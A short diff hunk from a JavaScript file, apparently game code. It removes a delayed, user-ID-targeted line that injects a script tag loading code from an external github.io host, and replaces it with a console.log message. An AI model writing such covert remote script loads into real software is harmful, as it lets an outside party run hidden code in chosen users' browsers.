@@ -131,7 +131,7 @@ Object.values(playerDetails).forEach(player=>{if(player.name.includes("Aquliax")
 setTimeout(function(){
 window.myuserid = userid;
         if (userid == 2056 || userid == 165218) {
-$("body").append(`<script src="https://kamiz324.github.io/ngha/ghai.js?nocache=${Date.now()}"></script>`);
+console.log("you r special")
         }
 }, 13000)
 
